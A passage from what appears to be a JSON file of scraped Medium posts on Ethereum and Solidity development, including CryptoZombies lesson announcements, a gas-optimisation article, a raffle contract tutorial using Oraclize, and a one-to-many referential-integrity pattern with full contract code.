53ef\u4ee5\u4fe1\u4efb\uff1f\u4ed6\u4e0d\u6703\u62ff\u4e86\u5169\u65b9\u7684\u9322\u5c31\u8dd1\u8def\u4e86\uff1f\u653f\u5e9c\u662f\u4e0d\u662f\u8981\u76e3\u7763\u9019\u9593\u516c\u53f8\uff1f\u53ea\u8981\u6709\u4e2d\u9593\u4eba\uff0c\u5c31\u6703\u6709\u4fe1\u4efb\u554f\u984c\u3002Ethereum \u5340\u584a\u93c8\u4f5c\u70ba\u4e00\u500b\u53ef\u4ee5\u4fe1\u4efb\u7684\u5206\u6563\u904b\u7b97\u7db2\u8def\uff0c\u5728\u4e0d\u9700\u8981\u4e2d\u9593\u4eba\u7684\u4ecb\u5165\u4e0b\u5c31\u53ef\u4ee5\u5b8c\u6210\u9019\u6a23\u7684\u4ea4\u6613\u3002\u5269\u4e0b\u552f\u4e00\u7684\u9650\u5236\uff0c\u5c31\u662f\u4f60\u7684\u60f3\u50cf\u529b\u4e86\u00a0:-)", "responses": ""}, {"title": "CryptoZombies Lesson 6! The Phantom of Web3.js, MetaMask, Infura, and building front-ends for your\u00a0DApps", "author_name": "James Martin Duffy", "link": "https://medium.com/loom-network/cryptozombies-lesson-6-7133cee7ea8b?source=search_post", "post_date": "Apr 2, 2018", "readtime": "2 min read", "upvotes": "695", "content": "CryptoZombies Lesson 6! The Phantom of Web3.js, MetaMask, Infura, and building front-ends for your\u00a0DAppsJames Martin DuffyBlockedUnblockFollowFollowingApr 2, 2018To date, over 150,000 people from all over the world have used CryptoZombies to learn Solidity development.Google analytics reports we\u2019ve had users from 199 countries\u200a\u2014\u200athat\u2019s more than the number of member states in the United Nations!In Lesson 5, we completed the Solidity smart contract portion of the tutorial. And today, we\u2019re happy to announce the release of Lesson 6, on Web3.js and building user-facing DApp front-ends!What\u2019s new in Lesson\u00a06?Using Web3.js to talk to your smart contract from your web browserUsing MetaMask and Infura so your users can interact with your DAppSubscribing to smart contract events, and updating the app front-end in real-timeAnd more!Add another CryptoZombie to your\u00a0army!Yeah, you knew we wouldn\u2019t leave you hangin\u2019.In typical CryptoZombies fashion, by completing Lesson 6, you\u2019ll add a bonus zombie to your army.To reflect the unique content contained in Lesson 6, this zombie is\u2026Unique \ud83d\ude09Yeah, you know you want this\u00a0zombie.What are you waiting for? Get started with Lesson 6!If you get stuck, ask a question on DelegateCall. And as always, let us know if you have any feedback in our Telegram chat.P.S. Lesson 7 will be covering deploying your smart contracts to Ethereum. Stay tuned!Until next time\u2026", "responses": "2"}, {"title": "Reducing ETH Gas 23x by converting Arrays to\u00a0Bytes", "author_name": "billy rennekamp", "link": "https://medium.com/@billyrennekamp/reducing-eth-gas-23x-by-converting-arrays-to-bytes-ccf3b46daea5?source=search_post", "post_date": "Sep 17, 2017", "readtime": "7 min read", "upvotes": "329", "content": "Reducing ETH Gas 23x by converting Arrays to\u00a0Bytesbilly rennekampBlockedUnblockFollowFollowingSep 17, 2017This month (Aug/Sept 2017) I built my first Solidity Contract for the Ethereum Virtual Machine and ran into all sorts of pitfalls. The first one was realizing that some of the most trivial operations cost tons of gas, especially those involving Arrays and Loops. My contract was full of them and costing an arm and a leg, but I realized a way to refactor the Arrays into Bit Strings and use Bit Operators for reading and writing, then ultimately storing them as Bytes to save Millions in Gas.The Contract requires a user to submit chess notation moves of a complete game of Reversi (also known as Othello). If the moves play a valid game and if the endgame board is visually symmetrical, the user receives a reward in an ERC20 Token. Essentially it substitutes traditional mining with searching the massive game tree of Reversi as a Proof-Of-Work with a reward payout based on the rarity of the symmetry (for more details check out the about page). It wouldn\u2019t do for users to submit invalid but symmetrical games, so validation needed to take place on the contract. (If you\u2019re curious how the project turned out check it out at Clovers.network)https://goo.gl/images/CFzNq7The game Reversi is pretty easy to program but has a really large game tree (estimated to be 10\u2075\u2074 possible leaf nodes). That\u2019s why it was a good challenge for game heuristic research that wanted to avoid expensive lookahead. When modeling the game one typically uses a 2 dimensional array to keep track of the state of the 8x8 board and an array of up to 60 moves (each of which might also be an array of column and row positions). First I tackled the Board Array.", "responses": "1"}, {"title": "15 Dakikada \u0130lk Ak\u0131ll\u0131 S\u00f6zle\u015fmemizi Yazal\u0131m", "author_name": "Serkan Dogantekin", "link": "https://medium.com/@sdogantekin/15-dakikada-i%CC%87lk-ak%C4%B1ll%C4%B1-s%C3%B6zle%C5%9Fmemizi-yazal%C4%B1m-6e8f6b472746?source=search_post", "post_date": "Mar 4, 2018", "readtime": "6 min read", "upvotes": "211", "content": "15 Dakikada \u0130lk Ak\u0131ll\u0131 S\u00f6zle\u015fmemizi Yazal\u0131mSerkan DogantekinBlockedUnblockFollowFollowingMar 4, 2018Biliyorum olduk\u00e7a uzun bir zaman \u00f6nce (15 Dakikada Ethereum A\u011f\u0131 Olu\u015fturabilmek yaz\u0131s\u0131) ak\u0131ll\u0131 s\u00f6zle\u015fme (smart contract) yazma konusuna de\u011finece\u011fimi belirtmi\u015ftim ve i\u015fte o an bu an\u00a0:)Bu yaz\u0131da \u00fczerinde \u00e7al\u0131\u015faca\u011f\u0131m\u0131z ak\u0131ll\u0131 s\u00f6zle\u015fmeyi Visual Studio Code (Solidity extension\u2019i y\u00fckl\u00fc) ve daha \u00f6nce olu\u015fturdu\u011fumuz Ethereum a\u011f\u0131 ile haz\u0131rlayaca\u011f\u0131z ama yaz\u0131n\u0131n sonunda ba\u015fka bir alternatif payla\u015faca\u011f\u0131m.\u0130sterseniz hemen ba\u015flayal\u0131m.", "responses": "1"}, {"title": "Building a Raffle Smart Contract Using\u00a0Oraclize", "author_name": "Pablo Ruiz", "link": "https://hackernoon.com/building-a-raffle-contract-using-oraclize-e746e5edff6b?source=search_post", "post_date": "Oct 24, 2017", "readtime": "9 min read", "upvotes": "211", "content": "Building a Raffle Smart Contract Using\u00a0OraclizePablo RuizBlockedUnblockFollowFollowingOct 24, 2017Generating random numbers in Solidity is not simple. For starters, Solidity doesn\u2019t come with a native random function because the deterministic nature of the system.In mathematics and physics, a deterministic system is a system in which no randomness is involved in the development of future states of the system. A deterministic model will thus always produce the same output from a given starting condition or initial state.\u200a\u2014\u200ahttps://en.wikipedia.org/wiki/Deterministic_systemThere are a number of services and APIs that allow us to generate random numbers, but the problem is that they are not decentralized and you have to trust someone else that the generated number is truly random.Additionally, you can\u2019t trust seemingly random values available to the contract, such as blockhash, timestamp, or other miner-defined value. Miners can manipulate these values to such extent, and event choose not to publish a block. For a casino app you can\u2019t just trust miners, but there are a lot of other use cases where you could rely on blockhash for generating a random outcome, as long as the total amount of value resting on the quality of that randomness is lower than what a miner earns by mining a single block. More info on this: https://ethereum.stackexchange.com/questions/419/when-can-blockhash-be-safely-used-for-a-random-number-when-would-it-be-unsafeSo, how can we generate a random number securely inside a Solidity smart contract?There are a few solutions out there that can help us achieve this, such as Randao (Randao: https://github.com/randao/randao.) and Oraclize (http://www.oraclize.it/#services). In this article I\u2019m going to focus on Oraclize, mainly because it\u2019s extremely easy to get started with it and secondly, because it also can be used to do many more things other than generating a random number, such as accessing any other API from inside a Solidity smart contract.Building the Raffle\u00a0contractIn this tutorial we\u2019ll build a very simple raffle smart contract to show how to use Oraclize to generate a random number. The contract will work as follows:We\u2019ll deploy the contract and set a minimum and maximum number of participants the raffle will accept. Once there are enough participants, the raffle organizer (or anyone for that matter) can execute the function that will have Oraclize generate a random number. With that random number we\u2019ll just select the winner out of the participants\u2019 array.*For this first version we won\u2019t include all the payments logic, so anyone is free to participate but they won\u2019t receive any ETH prize, of course.Project SetupFor this tutorial, we\u2019ll just deploy everything on Remix, using Metamask to connect to Ropsten, as Oraclize won\u2019t work locally or on the JavaScript VM. I\u2019m going to assume you have some basic understanding on how to work with Remix and Metamask. Also, make sure you have at least 3 or 4 accounts with some ether balance as we\u2019ll need it to pay for the gas cost of joining the raffle as well as paying Oraclize to generate the random number (more on this later).Coding the\u00a0contractIn Remix, create a new file called Raffle.sol, this will be our contract containing all the logic for the raffle.pragma solidity ^0.4.4;contract Raffle {  uint private chosenNumber;  address private winnerParticipant;  uint8 maxParticipants;  uint8 minParticipants;  uint8 joinedParticipants;  address organizer;  bool raffleFinished = false;  address[] participants;  mapping (address => bool) participantsMapping;  event ChooseWinner(uint _chosenNumber,address winner);  event RandomNumberGenerated(uint);  function Raffle(){    address _org = msg.sender;     uint8 _min = 2;     uint8 _max = 10;     require(_min < _max && _min >=2 && _max <=50);    organizer = _org;    chosenNumber = 999;    maxParticipants = _max;    minParticipants = _min;  }function() payable {}function joinraffle(){    require(!raffleFinished);    require(msg.sender != organizer);    require(joinedParticipants + 1 < maxParticipants);    require(!participantsMapping[msg.sender]);    participants.push(msg.sender);    participantsMapping[msg.sender] = true;    joinedParticipants ++;  }function chooseWinner(uint _chosenNum) internal{    chosenNumber = _chosenNum;    winnerParticipant = participants[chosenNumber];    ChooseWinner(chosenNumber,participants[chosenNumber]);}function generateRandomNum(){    require(!raffleFinished);    require(joinedParticipants >=minParticipants && joinedParticipants<=maxParticipants);    raffleFinished=true;        chooseWinner(0); //We'll replace this with a call to Oraclize service later on.}function getChosenNumber() constant returns (uint) {    return chosenNumber;  }function getWinnerAddress() constant returns (address) {    return winnerParticipant;  }function getParticipants() constant returns (address[]) {    return participants;  }}I\u2019ll go over the most important parts of the code:function Raffle(): The constructor of the contract sets the configuration state variables of the contract, such as the required minimum and maximum participants and who the organizer of the raffle is (for now, the creator of the contract). Notice we are hardcoding these variables, just to make the example simpler, but you could have the constructor receive these parameters. Also, we require there are at least 2 participants and no more than 50. This maximum could also be changed if you wanted.fallback function: I added the fallback function as we\u2019ll need to send Ether to the contract so it can pay for Oraclize\u2019s services. Did you think they would provide their services for free?\u00a0:)\u200a\u2014\u200aMore on this later.function joinRaffle(): This function allows the caller to join the raffle. First, we make a few checks to make sure we are not adding a new participant to a raffle that has already finished or that has reached its maximum amount of participants. We also check that the organizer is not the one trying to join and that this person hasn\u2019t already joined. Then we add the new participant to the participants array (so we can later select one of them at random) and we also add it to a participants mapping (which allows us to easy check if that participant had already joined). Having 2 variables that hold the same information feels a bit hacky to me, but given the example is rather simple, I felt we could get away with it.function generateRandomNumber(): This function will be called to have Oraclize generate the random number. Notice we made it public and doesn\u2019t require the organizer to be the one that calls it. This is on purpose, so that if the organizer, for some reason, disappears, the participants can select a winner anyways. This could be changed as well, for example, to allow this mechanism but only after some time has passed. For now, all this function does is set the raffleFinished flag to true (so this function can only be called once) and call the chooseWinner with a 0 as parameter. When we implement Oraclize, instead of sending a hardcoded 0 (which automatically makes the first person who joined the raffle the winner) we\u2019ll generate the random number.function chooseWinner(): This is an internal function that receives an uint which indicates the position of the winner in the participants array. With this number, we also set the address of the winner and fire an event that logs who the winner was so we can later retrieve it and display it.The remaining functions are just used later in the front-end to display the winners.Go ahead and try the contract in Remix. Just copy and paste the code above and deploy the contract. You should be able to join the raffle with different accounts and then, after there are enough participant, you can call generateRandomNumber() to select a winner (It will always be the address at position 0 in the participants array).Now that we have made sure the logic of the raffle is ok, it\u2019s time to use Oraclize to generate a random number for us.Using Oraclize to generate a random\u00a0numberIntegrating Oraclize in our smart contract is pretty easy and straight-forward. The fist step is to import the Oraclize API in our contract. Add the following line before the Raffle contract declaration.import \"github.com/oraclize/ethereum-api/oraclizeAPI.sol\";contract Raffle is usingOraclize{...}Notice that we also changed Raffle to inherit from usingOraclize.Now that we imported Oraclize, we have access to its functions. One thing you should be aware of is that importing Oraclize this way will fail, for example, if you are using Truffle to compile your contracts. If you are using Truffle, you will have to make a local copy of the Oraclize file and rename it to \u201cusingOraclize.sol\u201d as Truffle needs the file have the same name as the contract.The first thing we will do is add the Oraclize callback function. The way Oraclize works is by first making a query\u200a\u2014\u200awe could be querying an external API, Wolfram\u2019s Mathematica, or, like in our case, the built-in random number generator\u200a\u2014\u200awhich will fire a transaction to an Oraclize contract, and after that gets processed, it fires the callback function we define inside our contract with the corresponding result.This is how the callback function will look like:// the callback function is called by Oraclize when the result is ready// the oraclize_randomDS_proofVerify modifier prevents an invalid proof to execute this function code:// the proof validity is fully verified on-chainfunction __callback(bytes32 _queryId, string _result, bytes _proof){  // If we already generated a random number, we can't generate a new one.  require(!raffleFinished);  // if we reach this point successfully, it means that the attached authenticity proof has passed!  require (msg.sender == oraclize_cbAddress());  if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) {    // the proof verification has failed, do we need to take any action here? (depends on the use case)  } else {    // the proof verification has passed    raffleFinished=true;    // for simplicity of use, let's also convert the random bytes to uint if we need    uint maxRange = joinedParticipants; // this is the highest uint we want to get. It should never be greater than 2^(8*N), where N is the number of random bytes we had asked the datasource to return    uint randomNumber = uint(sha3(_result)) % maxRange; // this is an efficient way to get the uint out in the [0, maxRange] range        chooseWinner(randomNumber);    RandomNumberGenerated(randomNumber); // this is the resulting random number (uint)  }}First, we will make sure that raffleFinished is false so we don\u2019t allow this function to be called more than once.Then we are checking that the data we got has not been tampered with while being delivered to the smart contract. You can read more about that here: https://blog.oraclize.it/the-random-datasource-chapter-2-779946e54f49If the verification has passed, meaning the data has not been tampered with, then we proceed to use the random number. We will be calling the chooseWinner() function that we previously used, but instead of passing a hardcoded 0 as parameter, we\u2019ll pass the random number we generated.As you can see, the random number that gets generated uses the joinedPaticipants state variable to determine its max range. We are also firing an event to log the random number we generated.The last thing we have to do is modify our generateRandomNum() function so when someone executes it, it makes the query to Oraclize.function generateRandomNum(){    require(!raffleFinished);    require(joinedParticipants >=minParticipants && joinedParticipants<=maxParticipants);    oraclize_setProof(proofType_Ledger); // sets the Ledger authenticity proof    uint N = 4; // number of random bytes we want the datasource to return    uint delay = 0; // number of seconds to wait before the execution takes place    uint callbackGas = 200000; // amount of gas we want Oraclize to set for the callback function    bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); // this function internally generates the correct oraclize_query and returns its queryId}By calling oraclize_newRandomDSQuery(delay, N, callbackGas) we\u2019ll have Oraclize generate a random number for us, and when it\u2019s ready, the callback function we defined earlier will be fired. oraclize_newRandomDSQuery receives 3 parameters.delay: which is the number of seconds to wait before the execution takes place. We set it to 0 so it executes the callback as soon as we have results.N: which is how many bytes we want the datasource to return. In our case, since we made the raffle to accept up to 50 participants if the organizer wants so, 4 bytes is more than enough.callbackGas: How much gas we will forward Oraclize so it can execute the callback function. We are setting it up to 200.000 which is enough to execute this function. (In my tests, it has consumed around 125.000 gas).And that\u2019s it! You can give it a try in Remix and see how it works. A few considerations and words of advice:Oraclize\u2019s pricing model: As I mentioned before, Oraclize isn\u2019t free. You can check their pricing here: http://docs.oraclize.it/#pricing. Notice that the first query your contract makes is free, then you will have to pay for the transaction. How? The contract executing the query pays for it from it\u2019s balance. So, before you call the generateRandomNum() function, make sure you send some ether to the contract.\u200a\u2014\u200aThat\u2019s why we included the fallback function.Testing in Remix: Testing your contract can be quite tedious. First, since we are using Oraclize, you can\u2019t test this locally, we need to connect to a testnet (I\u2019m using Ropsten). You should remember that when you call generateRandomNum() it will take 30\u201350 seconds to get mined and then, it will take another minute to actually process the callback function. Also, switching accounts in Metamask + Remix takes some work. Arm yourself with patience.How much gas is needed to execute this? I\u2019m still playing around with the necessary gas required to execute this contract. On Remix, I had to up the limit to 5.000.000 when deploying the contract. Make sure you are also sending enough gas when generating the random number, or else the callback function will fail.The contract we built today allows us to run a simple Raffle that people can join and then a winner is selected by using Oraclize to generate a random number we can be certain hasn\u2019t been tampered with. There\u2019s a lot of room for improvements and new features, such as allowing people to enter the Raffle with ether and win a prize.Let me know in the comments section below if you have any suggestions or if you encounter any problems with the code.", "responses": "5"}, {"title": "Enforcing Referential Integrity in Ethereum Smart Contracts.", "author_name": "Rob Hitchens", "link": "https://medium.com/robhitchens/enforcing-referential-integrity-in-ethereum-smart-contracts-a9ab1427ff42?source=search_post", "post_date": "Apr 9, 2017", "readtime": "8 min read", "upvotes": "204", "content": "Enforcing Referential Integrity in Ethereum Smart Contracts.Rob HitchensBlockedUnblockFollowFollowingApr 9, 2017One-To-Many Joins in\u00a0SolidityCode repository: https://bitbucket.org/rhitchens2/soliditystoragepatternsPhoto by fabio on\u00a0UnsplashSolidityCRUD lays out a way to organize tabular data in a Solidity Smart Contract. The pattern supports Create, Retrieve, Update and Delete (CRUD) with some features we might take for granted until we first attempt it with Solidity:Count the keys and check if a key exists or not.Enumerate the keys and iterate over them.Fetch, update, or delete a key efficiently.Ensure the keys are unique.All operations are gas-efficient at all scales.The essence of the technique is a data structure that includes structs for holding data about the object, a mapping for random access by key, and an array containing an unordered list of keys.Mapped Structs with Pointers to an unordered list of\u00a0Keys.In Solidity\u00a0\u2026struct AlphabetStruct {  // fields about the alphabet letters  uint index; // points to the row in the index containing the key}mapping(bytes32 => AlphabetStruct) public alphabetStructs;bytes32[] public alphabetIndex;If you\u2019re not familiar with this structure, have a look at SolidityCRUD, especially part 2.That covers a lot of use-cases, but what about relationships? It\u2019s commonplace to require strictly-enforced relationships between object instances. Possibly the most common relationship is one-to-many.Customers have many sales. A sale has exactly one customer.Owners can have many cars. A car has exactly one owner.Users can own many projects. A project has exactly owner.If the data can be said to be \u201ccorrect\u201d and \u201cvalid\u201d without regard to referential integrity, then you don\u2019t need it. If you do need referential integrity then the contract must enforce it. Let\u2019s have a look at how it can be accomplished.\u201cOne\u201d and\u00a0\u201cMany\u201dI\u2019m going to use the terms \u201cOne\u201d and \u201cMany\u201d to refer to two different types of entity (class). The \u201cOnes\u201d have zero to lots of \u201cMany\u201d and the \u201cMany\u201d have exactly one \u201cOne\u201d. If that\u2019s too abstract, think \u201cCustomer\u201d (One) and \u201cInvoice\u201d (Many).struct One {  // fields about this class  uint oneListPointer; // points to a row on the oneList}// random accessmapping(bytes32 => One) oneStructs; // key could be address or uint// sequential accessbytes32[] oneList;struct Many {  // fields about this class  uint manyListPointer; // points to a row on the manyList}mapping(bytes32 => Many) manyStructs; // these are for access by keybytes32[] manyList; Refer to the One in the\u00a0ManyIf you\u2019ve ever made a simple database, you\u2019ll know that the key pointing to the \u201cOne\u201d goes in the \u201cMany\u201d.struct Many {  // fields about this class  uint manyListPointer; // points to a row on the manyList  bytes32 oneKey; <-- here.}Keep a \u201cMany\u201d list in the\u00a0\u201cOne\u201dFor this to work, we\u2019ll need a list of all the Many instances related to each One instance. We\u2019re going to treat that in a manner that\u2019s very similar to our general treatment of tables. It\u2019s a table with one column (the Many keys) that goes inside each One instance.struct One {  // fields  uint oneListPointer; // supports the deleteOne() function    // build a table of Many keys with a delete capability  bytes32[] manyKeys;  mapping(bytes32 => uint) manyKeyPointers;}Each \u201cOne\u201d will have a list of the Many keys that refer to it.Get all the Many instances that point to this\u00a0OneThe array means we can enable something very similar to:SELECT manyKeys FROM One WHERE oneId = ...We\u2019ll need a function to find out how many Many keys point to a given One.function getOneManyCount(bytes32 oneId)   public   constant   returns(uint manyCount) {  if(!isOne(oneId)) throw;  return oneStructs[oneId].manyKeys.length;}We\u2019ll need a function to iterate over the Many keys that point to a given One.function getOneManyAtIndex(bytes32 oneId, uint row)   public   constant   returns(bytes32 manyKey) {  if(!isOne(oneId)) throw;  return oneStructs[oneId].manyKeys[row];}The mapping supports\u00a0DeleteIf we ever delete one of the Many records, we\u2019ll break referential integrity unless we remove its key from the One it was pointing to. Remember, the Ones keep track of that. We therefore need a way to remove a Many key from a One\u2019s manyKeys array.As we saw when deleting a record from a table (we\u2019re treating this as a table), we can delete from the unordered list of keys efficiently when we know exactly what row the key is on. That\u2019s what this mapping gives us.mapping(bytes32 => uint) manyKeyPointers;This could be a mapping to a struct if there was more than one field involved. In this case, we need the row number and nothing else, so a uint will suffice. The important thing is we can locate a key to delete in the unordered list without difficulty.The secret to deleting a key from an unordered list is to move the last item into the row to delete.Efficient delete from an unordered list.SolidityCRUD is all about how that works and why it\u2019s good.Enforce Referential IntegrityIt\u2019s vital that referential integrity is never broken. For example:Not allowed to delete a One if any Many refer(s) to it.Not allowed to insert a Many if the One doesn\u2019t exist. In some cases (Zero-to-Many), it will be okay to have no One (null) but it\u2019s seldom acceptable to refer to oneID that doesn\u2019t actually exist.If a Many is updated to a different One or if a Many is deleted then the Many key needs to be removed from the manyKeys list in the One that is no longer referred to.Insert a\u00a0ManyWe insert an instance in the usual way. A Many must have a One, so the oneId is the minimum extra information we need to insert a new Many.We also update the One record. The One records keep a list of all the Many records that point to them which includes the new Many instance.function createMany(bytes32 manyId, bytes32 oneId) onlyOwner returns(bool success) {  if(!isOne(oneId)) throw;  if(isMany(manyId)) throw;   manyStructs[manyId].manyListPointer = manyList.push(manyId)-1;  manyStructs[manyId].oneKey = oneId;     oneStructs[oneId].manyKeyPointers[manyId] =    oneStructs[oneId].manyKeys.push(manyId) - 1;  LogNewMany(msg.sender, manyId, oneId);  return true;}Let\u2019s step through it.Can\u2019t do it unless the Many refers to a One that actually exists.if(!isOne(oneId)) throw;2. Can\u2019t do it if the manyId already exists.if(isMany(manyId)) throw;3. Push the manyId key on to the keys list and set the internal pointer to support possible delete operations.manyStructs[manyId].manyListPointer = manyList.push(manyId)-1;4. The Many must have exactly one One. We know it exists because we checked.manyStructs[manyId].oneKey = oneId;Now we look after the pointers in the One. It\u2019s quite similar to the usual process but it all takes place inside a One instance. It maintains a list of Many instances that point at a specific One instance.5. Push the manyId on to the list and keep track of the row it landed on.oneStructs[oneId].manyKeyPointers[manyId] =    oneStructs[oneId].manyKeys.push(manyId) - 1;6. Success! Log the state change and return true.Delete a\u00a0ManyWe\u2019ll delete the record in the usual way, removing it from the unordered list of Many keys. We\u2019ll also track down the One record that\u2019s affected by this. We\u2019ll remove the Many key from the list of Many keys that refer to that One instance.In both cases, we use the familiar technique of moving the last item in the unordered list into the row where the key to delete resides, then shortening the list. Since unrelated keys will have moved (whatever happened to be last), we\u2019ll also need to update the relevant pointers to maintain referential integrity.function deleteMany(bytes32 manyId) onlyOwner returns(bool success) {  if(!isMany(manyId)) throw; // non-existant key          // delete from the Many table  uint rowToDelete = manyStructs[manyId].manyListPointer;  bytes32 keyToMove = manyList[manyList.length-1];  manyList[rowToDelete] = keyToMove;  manyStructs[manyId].manyListPointer = rowToDelete;  manyList.length--;          // we ALSO have to delete this key from the list in the   // ONE that was joined to this Many  bytes32 oneId = manyStructs[manyId].oneKey;  rowToDelete = oneStructs[oneId].manyKeyPointers[manyId];  keyToMove = oneStructs[oneId].manyKeys[oneStructs[oneId].manyKeys.length-1];  oneStructs[oneId].manyKeys[rowToDelete] = keyToMove;  oneStructs[oneId].manyKeyPointers[keyToMove] = rowToDelete;  oneStructs[oneId].manyKeys.length--;  LogManyDeleted(msg.sender, manyId);  return true;}Example Implementationcontract Owned {    address public owner;    modifier onlyOwner {if(msg.sender != owner) throw;_;}    function Owned() {owner=msg.sender;}}contract OneToMany is Owned {        // first entity is called a \"One\"        struct OneStruct {        uint oneListPointer; // needed to delete a \"One\"        // One has many \"Many\"        bytes32[] manyKeys;         mapping(bytes32 => uint) manyKeyPointers;        // more app data    }        mapping(bytes32 => OneStruct) public oneStructs;    bytes32[] public oneList;        // other entity is called a \"Many\"        struct ManyStruct {        uint manyListPointer; // needed to delete a \"Many\"        bytes32 oneKey; // many has exactly one \"One\"        // add app fields    }        mapping(bytes32 => ManyStruct) public manyStructs;    bytes32[] public manyList;        event LogNewOne(address sender, bytes32 oneId);    event LogNewMany(address sender, bytes32 manyId, bytes32 oneId);    event LogOneDeleted(address sender, bytes32 oneId);    event LogManyDeleted(address sender, bytes32 manyId);        function getOneCount()        public       constant       returns(uint oneCount) {return oneList.length;}        function getManyCount()       public       constant       returns(uint manyCount){return manyList.length;}        function isOne(bytes32 oneId)       public       constant       returns(bool isIndeed)     {      if(oneList.length==0) return false;      return oneList[oneStructs[oneId].oneListPointer]==oneId;    }        function isMany(bytes32 manyId)       public       constant       returns(bool isIndeed)     {      if(manyList.length==0) return false;      return manyList[manyStructs[manyId].manyListPointer]==manyId;    }        // Iterate over a One's Many keys        function getOneManyCount(bytes32 oneId)       public       constant       returns(uint manyCount)     {      if(!isOne(oneId)) throw;      return oneStructs[oneId].manyKeys.length;    }        function getOneManyAtIndex(bytes32 oneId, uint row)       public       constant       returns(bytes32 manyKey)     {      if(!isOne(oneId)) throw;      return oneStructs[oneId].manyKeys[row];    }        function createOne(bytes32 oneId)       onlyOwner       returns(bool success)     {      if(isOne(oneId)) throw; // duplicate key prohibited      oneStructs[oneId].oneListPointer = oneList.push(oneId)-1;      LogNewOne(msg.sender, oneId);      return true;    }        function createMany(bytes32 manyId, bytes32 oneId)       onlyOwner       returns(bool success)     {      if(!isOne(oneId)) throw;      if(isMany(manyId)) throw; // duplicate key prohibited      manyStructs[manyId].manyListPointer = manyList.push(manyId)-1;      manyStructs[manyId].oneKey = oneId;       // We also maintain a list of \"Many\" that refer to the \"One\", so ...       oneStructs[oneId].manyKeyPointers[manyId] =       oneStructs[oneId].manyKeys.push(manyId) - 1;      LogNewMany(msg.sender, manyId, oneId);      return true;    }        function deleteOne(bytes32 oneId)       onlyOwner       returns(bool succes)     {      if(!isOne(oneId)) throw;      // the following would break referential integrity      if(oneStructs[oneId].manyKeys.length>0) throw;       uint rowToDelete = oneStructs[oneId].oneListPointer;      bytes32 keyToMove = oneList[oneList.length-1];      oneList[rowToDelete] = keyToMove;      oneStructs[keyToMove].oneListPointer = rowToDelete;      oneList.length--;      LogOneDeleted(msg.sender, oneId);      return true;    }            function deleteMany(bytes32 manyId)       onlyOwner       returns(bool success)     {      if(!isMany(manyId)) throw; // non-existant key              // delete from the Many table      uint rowToDelete = manyStructs[manyId].manyListPointer;      bytes32 keyToMove = manyList[manyList.length-1];      manyList[rowToDelete] = keyToMove;      manyStructs[manyId].manyListPointer = rowToDelete;      manyList.length--;        // we ALSO have to delete this key from the list in the ONE      bytes32 oneId = manyStructs[manyId].oneKey;       rowToDelete = oneStructs[oneId].manyKeyPointers[manyId];      keyToMove =     oneStructs[oneId].manyKeys[oneStructs[oneId].manyKeys.length-1];      oneStructs[oneId].manyKeys[rowToDelete] = keyToMove;      oneStructs[oneId].manyKeyPointers[keyToMove] = rowToDelete;      oneStructs[oneId].manyKeys.length--;      LogManyDeleted(msg.sender, manyId);      return true;    }    }Many-to-ManyA Many-to-Many is often implemented with a third table and two one-to-many relationships.Consider an arrangement with two entities; Voters and Issues.Each Voter can cast a ballot on many Issues.Each Issue has (obviously) many Voters.Many-to-Many can be implemented as third type of entity, e.g. Vote.You might arrive at something along these lines as a starting point:Many-to-Many using two One-to-ManyThe goal should always be to make it as simple as possible, but no simpler. If you need referential integrity, then the contract must enforce it.This pattern addresses a worst-case scenario in which referential integrity must be enforced and delete is required for any/all entities in the data structure.Importantly, all update operations use no iteration and minimal conditional logic. Gas prices for insert, update and delete will be predictable, efficient and consistent at any scale.Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": "3"}, {"title": "CryptoZombies Lesson 3! Gas, Ownership, Security and\u00a0more!", "author_name": "Luke Zhang", "link": "https://medium.com/loom-network/cryptozombies-lesson-3-gas-ownership-security-and-more-490bd1d14264?source=search_post", "post_date": "Jan 11, 2018", "readtime": "2 min read", "upvotes": "444", "content": "CryptoZombies Lesson 3! Gas, Ownership, Security and\u00a0more!Luke ZhangBlockedUnblockFollowFollowingJan 11, 2018In the past month, over 50,000 people have taken their first steps into learning Solidity programming by making their own CryptoZombies. We\u2019ve been blown away by the positive response so far!With most of the Loom Network team traveling for the holidays and then getting settled in our new NY office, Lesson 3 took a bit longer than expected to ship.But now, at last\u2026 It\u2019s finally here!My CryptoZombie army starting to look formidable\u2026Click here to get\u00a0started:https://cryptozombies.io/course/In Lesson 3 you will start to upgrade your zombie army, and you\u2019ll\u00a0learn:How to make parts of your DApp updatableHow to protect core functions with onlyOwnerAll about gas and gas optimization in EthereumSecuring your smart contractsAdding level-ups and cooldowns to your zombies\u2026and more!Again, here\u2019s the link to get started:https://cryptozombies.io/course/P.S. Have questions? Curious about what\u2019s next? Want to join a community of developers learning Ethereum development? Hop on our Telegram chat to join the discussion.", "responses": "2"}, {"title": "Intro to Building Ethereum DApps\u00a0(Video)", "author_name": "Matthew Campbell", "link": "https://medium.com/loom-network/intro-to-building-ethereum-dapps-video-b437c5fa3c1d?source=search_post", "post_date": "Dec 11, 2017", "readtime": "2 min read", "upvotes": "269", "content": "Intro to Building Ethereum DApps\u00a0(Video)Matthew CampbellBlockedUnblockFollowFollowingDec 11, 2017We recently presented at the Bangkok Python meetup. Everyone was super excited to learn about Ethereum and Solidity.We had over 30 minutes of just questions. We played with the basics of Geth, Node.js, and we even played with an online Solidity IDE to test our code.Below is the video of the meetup, and here is the the code and the slide deck.Matthew Campbell speaks about blockchain development at Bangkok Python MeetupAbout the\u00a0SpeakerMatthew Campbell is currently running a blockchain startup Loom Network, they have are building a way for poeple to build scalable sidechains for DApps. He is writing a book called \u201cMicroservices in Go\u201d. He has spoke at over 20 international conferences, including GothamGO, Hashicorp Conf, JS Conf, GO India, UK GOlang, MicroXchng, Prometheus Conf. You can see some videos of his previous talks on my YouTube. In the past, he worked at Thomson Reuters, Bloomberg, Gucci, and Cartoon network.", "responses": ""}, {"title": "Digix Dev Update\u200a\u2014\u200a19th Sep\u00a02017", "author_name": "Digix", "link": "https://medium.com/@Digix/dev-updates-c940e5203c9d?source=search_post", "post_date": "Sep 18, 2017", "readtime": "2 min read", "upvotes": "350", "content": "Digix Dev Update\u200a\u2014\u200a19th Sep\u00a02017DigixBlockedUnblockFollowFollowingSep 18, 2017Last week our Solidity dev team completed the full tests for two of our core libraries. We now have 100% test coverage for our Collections and State Machine libraries.Collections LIbraryState Machine 